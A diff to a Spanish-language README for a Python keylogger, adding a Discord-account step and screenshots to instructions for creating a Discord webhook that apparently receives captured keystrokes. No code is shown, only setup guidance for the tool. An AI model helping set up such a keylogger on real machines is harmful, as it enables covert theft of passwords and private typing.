@@ -6,8 +6,8 @@ Este script de python capturara todas las teclas apretadas durante una ventana d
 
 ## Deployment
 
-Tener Python instalado en su maquina, descargar el lenguaje desde [aqui](https://www.python.org/downloads/).
-
+- Tener Python instalado en su maquina, descargar el lenguaje desde [aca](https://www.python.org/downloads/).
+- Crear una cuenta de discord, como hacerlo [aca](https://youtu.be/dinlzJlzIB4)
 
 ## Instalar librerias requeridas
 ```
@@ -22,7 +22,11 @@ Puedes usar [este](https://support.discord.com/hc/en-us/articles/204849977-How-d
 
 Ingresa a la configuracion del servidor y selecciona Intergrations >>  Webhooks y crear un nuevo Webhook, se lo puede customizar y darle un nombre y un icono. Es necesario copiar al URL del webhook.
 
-![screenshot](https://i.imgur.com/i084ESb.png)
+![screenshot1](https://imgur.com/CuLnE5c.png)
+
+![screenshot2](https://imgur.com/24A58iM.png)
+
+![screenshot3](https://i.imgur.com/i084ESb.png)
 
 ## Editar keylogger.py
 
